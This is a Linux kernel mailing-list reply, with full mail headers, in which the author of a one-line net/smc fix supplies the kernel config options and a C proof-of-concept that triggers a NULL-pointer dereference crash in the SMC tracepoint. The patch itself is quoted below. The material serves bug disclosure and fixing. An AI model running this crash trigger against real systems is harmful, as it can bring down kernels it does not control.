Received: from mail-pg1-f179.google.com (mail-pg1-f179.google.com [209.85.215.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 08B4E3314AC
	for <linux-s390@vger.kernel.org>; Sun, 10 May 2026 22:50:18 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.215.179
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1778453420; cv=pass; b=rrY0rxzMl/yrENr4QM100aL+fFs0uyIRwzwyhUwZa+pCVPole5GekAnQswqxEd2rU3TtKFMatabINaEHlHr71q3uGwSHNW2vlZ4pkMkpBirrmZGjHm65etkwYtH92MP7hG6FQh/6v9jU+woZYoKfyDTJuAFmv5uGq62iGwQC1NQ=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1778453420; c=relaxed/simple;
	bh=GdDuPUl/5DODk9Ku20HqiyncCvH+aaXy4qnWJ3JrMsY=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=d48+xMtTsJdhykZQjXp+518YyzCAckrqBVB7J0ChQZ6TMWTPxb10N8OCgwL/RD20jM2eVDQgMTVghYzTkWhcG0IxbUW0ojc71yLmLZGwZt2UtN0NCA/tUhO6qEmK83XIn3vy6yy5olALKe2XyUVLMRDgvCKEuMhPDFLkFLn7lsI=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=s8x0IL2f; arc=pass smtp.client-ip=209.85.215.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="s8x0IL2f"
Received: by mail-pg1-f179.google.com with SMTP id 41be03b00d2f7-c80148ae949so1520383a12.2
        for <linux-s390@vger.kernel.org>; Sun, 10 May 2026 15:50:18 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1778453418; cv=none;
        d=google.com; s=arc-20240605;
        b=gHpViP6CAwy4ObzCDZnitr3hSd6Xo41b9V5dYM8VI9+k7dlwUp7Jd/Uy/0AeDGKqrS
         VYuwjEKzcwJKW2sPqTHgggtNYMtAL2kijg2bF35SvcSC0MSyaiFoUHX8H2iyCOv73FV7
         LMjRzvbLjKmwK4awRwJoHaR3siN7I9geLO6AZE3i4rMH1h51DiAHM9eW1Ahdihq+IvRU
         wxi7O+SlVc1hfJJpGkGicfF/wwbPm9lcXf83LE+YPGVg0pxaAYBIiNm5Ty7Q9aaGlM+i
         QQL6grZMqGAyK5+td0HltUQjqeotn8y8RIowaQEgyWgjwfMVpjMiwLe73IEzjZuQBtWn
         6AtQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=QQ4ZFhALull78SbemBQoH8t5StYSJiTbmXg8pgI2Izo=;
        fh=QrsmZ7GQk8rlD/LhhNTLI8VGlxMuS2pmAW9n4D70gUo=;
        b=i0HcLAwE2zME8uhCHyOhCOvJjzLUQCcA1TSQmB8ig3Nm5oPTDzWLp1dRWF0SgcLhmc
         xllt7vFCy5NXHVZULRdsTht40rjibTTqNTeHK36t+/zQeENP+aTkaNd0uPne3reMQEKq
         /1qXqmEVb+lckHu26FyghSHvwxQNLu5F5oUJT6rneZ9rQUsFEDLMxX//R+HCws0xZENt
         EIzHNOsjgOmVvgyXxjyxqjQdaLMOEM0Nnr8UklwnCLS1pHxSYI/KqIMCuEw/6vSN5W8v
         FqIDCWEhRUIxBd531DNqbuWu+3qM/J88ZRs0oCZD9/VXKP3ro6P/iorFR/YdZ4+2YJld
         72/w==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1778453418; x=1779058218; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=QQ4ZFhALull78SbemBQoH8t5StYSJiTbmXg8pgI2Izo=;
        b=s8x0IL2fMPMzNEhZyKGegtmVKKzEozz18D92S+T5AU2dcfH/74CCsVv9m17plv+W0M
         STB0mgomkSpj3ucXTwXNCrHaPQ3JNCRHngMwysf7w8SvniDrTJ7Wo721vkW6VbIfNYiT
         5p0MBXanm6EWduAsqkU3byP7783sP7uoyg+zaSKDbZgawqA7mztke79knQTGCDMYl0aI
         YdzX/AIv06aXnKtQkXQnTU5S2THu9v7D/tAffA1ivAkD4rbbi8mhlxQwXw5maL/ap2/2
         SgLd4fmOdEdFqtsVkRZ7D3XBB3DryzK57TeM2Xo0JHHbV19UzrZJN1e8SwR3QHI7ETNF
         Avlg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1778453418; x=1779058218;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=QQ4ZFhALull78SbemBQoH8t5StYSJiTbmXg8pgI2Izo=;
        b=R+i3uCmeacR0bpGDfb6+jfxPnjvzU7wVVTjfsfGkW0kftLfyIpiZePacB5m4Zxe+eq
         A1Yjk5+RHzXcLKUJlfutbDVUD2Qzc1dL/XTtjM9guuNyJMywc/QhwZPTkWGB6eaKrZy+
         pU3LzdZhouL1Nsh6yF3hXrhTDOWW8RSXRF5dAtLl8QU9bDK/E4UZfEc3HUOCBboHZVIF
         t7U2yQDpeVdLCjRm1PJq74Mhznq4jjen+YH3k5Qs8hAhY/JVaJsyujF28iPfMVZwY0Du
         YbLcIHjJgqox1A+2gTH4Oir0Lim2yd7Jtz9EdjCpFcs79HpWB2XJbZ+Cb0+9u5hixcEG
         3U/Q==
X-Forwarded-Encrypted: i=1; AFNElJ/LPeEMWSMLSkySfB4Hvn2k/gGbQZaDXYrVERpheAcrDV626vLBzVPlrw726S4NULlwP5hcah3wN6Xy@vger.kernel.org
X-Gm-Message-State: AOJu0YyX8uCURs8US81+LXI9wSSJinvmG0A9n1vaPT/YAg485I/fH3g3
	6yZW++LdfRpPLfGlebY6u0eDbsOog8JkUW6G3avJJVCU/oDjcbEa9bPlIvoeQIkCG9XwuCBFis/
	5ozS1xRRB56nKTJSgeHW9yaiZyvcWOYVui6vI7KMy
X-Gm-Gg: Acq92OEUMyXvkN5/aVEHStQZzYZBZTZ38NDsI42iI+hZLp69J01UlOP6dZ0PKrfoAai
	2Ft9G9t/2nZjK65vWHD8W6Qt9jAA2VXnssMGZ6yxuNkl/IzM8XnSdegI7ELZGeC+eiGY2u/fbl+
	fHrE6OgOLAYAJK6DYhPjlnoaHlgGASTa4zP2CNtBfwuusJuw2awOOP7aLdUVT/YrWCFlWF/VcIg
	DUCcr22FhzwEtCj5GPp0UXC9ALrIga7DPjgm9BoHXWaIMoPZPgtVFeXAalFS0vPr83NvYCpweAS
	NEPhZ0BzEnSmSN3qqps=
X-Received: by 2002:a17:902:cec8:b0:2b2:57df:264d with SMTP id
 d9443c01a7336-2ba794b969emr232289395ad.33.1778453418291; Sun, 10 May 2026
 15:50:18 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-s390@vger.kernel.org
List-Id: <linux-s390.vger.kernel.org>
List-Subscribe: <mailto:linux-s390+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-s390+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260510222640.1230720-1-xmei5@asu.edu>
In-Reply-To: <20260510222640.1230720-1-xmei5@asu.edu>
From: Xiang Mei <xmei5@asu.edu>
Date: Sun, 10 May 2026 15:50:07 -0700
X-Gm-Features: AVHnY4Lx7pvJLi9l8e3YnSoRtbj4JqeWz9uDQ5uIgVEZDDZubYvWHBJqDJyiZBA
Message-ID: <CAPpSM+Rhq8UjdGVfAY5v8sX1N81wExMxZck0nPPYcFq69kijdA@mail.gmail.com>
Subject: Re: [PATCH net] net/smc: avoid NULL deref of conn->lnk in
 smc_msg_event tracepoint
To: netdev@vger.kernel.org
Cc: alibuda@linux.alibaba.com, dust.li@linux.alibaba.com, wenjia@linux.ibm.com, 
	sidraya@linux.ibm.com, tonylu@linux.alibaba.com, linux-rdma@vger.kernel.org, 
	linux-s390@vger.kernel.org, bestswngs@gmail.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Thanks for your attention to this bug. Here are some resources to help
you trigger the bug.

Required configs:
```
CONFIG_SMC=3Dy
CONFIG_DIBS=3Dy
CONFIG_DIBS_LO=3Dy
CONFIG_SMC_DIAG=3Dy
```

Here is a PoC trigger that causes the intended crash shown in the commi mes=
sage:
```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>

#define AF_SMC 43
#define PORT   30421
#define SMC_NETLINK_ADD_UEID    10
#define SMC_NETLINK_ENABLE_SEID 14
#define SMC_NLA_EID_TABLE_ENTRY 1
#define SMC_MAX_EID_LEN 32

struct nl_req {
    struct nlmsghdr  nh;
    struct genlmsghdr gh;
    char buf[64];
};

static int resolve_smc_family(int fd) {
    struct nl_req req =3D {0};
    const char *name =3D "SMC_GEN_NETLINK";
    int name_len =3D strlen(name) + 1;

    req.nh.nlmsg_type  =3D GENL_ID_CTRL;
    req.nh.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
    req.nh.nlmsg_seq   =3D 1;
    req.gh.cmd         =3D CTRL_CMD_GETFAMILY;
    req.gh.version     =3D 1;
    struct nlattr *na =3D (struct nlattr *)req.buf;
    na->nla_type =3D CTRL_ATTR_FAMILY_NAME;
    na->nla_len  =3D NLA_HDRLEN + name_len;
    memcpy((char *)na + NLA_HDRLEN, name, name_len);
    req.nh.nlmsg_len =3D NLMSG_HDRLEN + sizeof(req.gh) + NLA_ALIGN(na->nla_=
len);
    send(fd, &req, req.nh.nlmsg_len, 0);

    char resp[1024];
    int n =3D recv(fd, resp, sizeof(resp), 0);
    if (n < 0) return -1;
    struct nlmsghdr *nh =3D (struct nlmsghdr *)resp;
    struct genlmsghdr *gh =3D NLMSG_DATA(nh);
    int len =3D nh->nlmsg_len - NLMSG_LENGTH(sizeof(*gh));
    struct nlattr *attr =3D (struct nlattr *)((char *)gh + sizeof(*gh));
    while (len > 0 && (int)attr->nla_len <=3D len) {
        if (attr->nla_type =3D=3D CTRL_ATTR_FAMILY_ID)
            return *(uint16_t *)((char *)attr + NLA_HDRLEN);
        int aligned =3D NLA_ALIGN(attr->nla_len);
        attr =3D (struct nlattr *)((char *)attr + aligned);
        len -=3D aligned;
    }
    return -1;
}

static void smc_genl(int fd, int family_id, int cmd, struct nlattr *na) {
    struct nl_req req =3D {0};
    req.nh.nlmsg_type  =3D family_id;
    req.nh.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
    req.nh.nlmsg_seq   =3D 2;
    req.gh.cmd         =3D cmd;
    req.gh.version     =3D 1;
    int payload =3D sizeof(req.gh);
    if (na) {
        memcpy(req.buf, na, na->nla_len);
        payload +=3D NLA_ALIGN(na->nla_len);
    }
    req.nh.nlmsg_len =3D NLMSG_HDRLEN + payload;
    send(fd, &req, req.nh.nlmsg_len, 0);
    char resp[256];
    recv(fd, resp, sizeof(resp), 0);
}

static void write_str(const char *path, const char *val) {
    int fd =3D open(path, O_WRONLY);
    if (fd < 0) return;
    write(fd, val, strlen(val));
    close(fd);
}

static void *server_thread(void *arg) {
    int srv =3D socket(AF_SMC, SOCK_STREAM, 0);
    int one =3D 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa =3D {0};
    sa.sin_family =3D AF_INET;
    sa.sin_port =3D htons(PORT);
    sa.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK);
    bind(srv, (struct sockaddr *)&sa, sizeof(sa));
    listen(srv, 1);
    accept(srv, NULL, NULL);
    sleep(5);
    return NULL;
}

int main(void) {
    mkdir("/sys/kernel/tracing", 0755);
    mount("nodev", "/sys/kernel/tracing", "tracefs", 0, NULL);
    // Imitate the enviroment with smc_tx_sendmsg enabled
    write_str("/sys/kernel/tracing/events/smc/smc_tx_sendmsg/enable", "1");

    int nl =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    int fid =3D resolve_smc_family(nl);

    smc_genl(nl, fid, SMC_NETLINK_ENABLE_SEID, NULL);

    /* ADD_UEID: 32-byte EID padded with spaces, trailing NUL. */
    char buf[NLA_HDRLEN + SMC_MAX_EID_LEN + 1] =3D {0};
    struct nlattr *na =3D (struct nlattr *)buf;
    na->nla_type =3D SMC_NLA_EID_TABLE_ENTRY;
    na->nla_len  =3D NLA_HDRLEN + SMC_MAX_EID_LEN + 1;
    char *eid =3D buf + NLA_HDRLEN;
    memset(eid, ' ', SMC_MAX_EID_LEN);
    memcpy(eid, "TESTUEID", 8);
    smc_genl(nl, fid, SMC_NETLINK_ADD_UEID, na);
    close(nl);

    pthread_t tid;
    pthread_create(&tid, NULL, server_thread, NULL);
    usleep(500000);

    int cli =3D socket(AF_SMC, SOCK_STREAM, 0);
    struct sockaddr_in sa =3D {0};
    sa.sin_family =3D AF_INET;
    sa.sin_port =3D htons(PORT);
    sa.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK);
    connect(cli, (struct sockaddr *)&sa, sizeof(sa));
    send(cli, "x", 1, 0);  /* trace_smc_tx_sendmsg -> NULL deref via
smc->conn.lnk */
    sleep(2);
    return 0;
}
```

Feel free to ask for more information.
Thanks,
Xiang

On Sun, May 10, 2026 at 3:26=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrote:
>
> The smc_msg_event tracepoint class, shared by smc_tx_sendmsg and
> smc_rx_recvmsg, unconditionally dereferences smc->conn.lnk:
>
>         __string(name, smc->conn.lnk->ibname)
>
> conn->lnk is only set for SMC-R; for SMC-D it is NULL. Other code on
> these paths already handles this (e.g. !conn->lnk in
> SMC_STAT_RMB_TX_SIZE_SMALL()). With the tracepoint enabled, the first
> sendmsg()/recvmsg() on an SMC-D socket crashes:
>
>   Oops: general protection fault, probably for non-canonical address
>   KASAN: null-ptr-deref in range [...]
>   RIP: 0010:strlen+0x1e/0xa0
>   Call Trace:
>    trace_event_raw_event_smc_msg_event (net/smc/smc_tracepoint.h:44)
>    smc_rx_recvmsg (net/smc/smc_rx.c:515)
>    smc_recvmsg (net/smc/af_smc.c:2859)
>    __sys_recvfrom (net/socket.c:2315)
>    __x64_sys_recvfrom (net/socket.c:2326)
>    do_syscall_64
>
> The faulting address 0x3e0 is offsetof(struct smc_link, ibname),
> confirming the NULL ->lnk deref. Enabling the tracepoint requires
> root, but the trigger itself is unprivileged: socket(AF_SMC, ...) has
> no capability check, and SMC-D negotiation needs no admin step on
> s390 or on x86 with the loopback ISM device loaded.
>
> Log an empty device name for SMC-D instead of dereferencing NULL.
>
> Fixes: aff3083f10bf ("net/smc: Introduce tracepoints for tx and rx msg")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Assisted-by: Claude:claude-opus-4-7
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  net/smc/smc_tracepoint.h | 2 +-
>  1 file changed, 1 insertion(+), 1 deletion(-)
>
> diff --git a/net/smc/smc_tracepoint.h b/net/smc/smc_tracepoint.h
> index a9a6e3c1113a..53da84f57fd6 100644
> --- a/net/smc/smc_tracepoint.h
> +++ b/net/smc/smc_tracepoint.h
> @@ -51,7 +51,7 @@ DECLARE_EVENT_CLASS(smc_msg_event,
>                                      __field(const void *, smc)
>                                      __field(u64, net_cookie)
>                                      __field(size_t, len)
> -                                    __string(name, smc->conn.lnk->ibname=
)
> +                                    __string(name, smc->conn.lnk ? smc->=
conn.lnk->ibname : "")
>                     ),
>
>                     TP_fast_assign(
> --
> 2.43.0
>
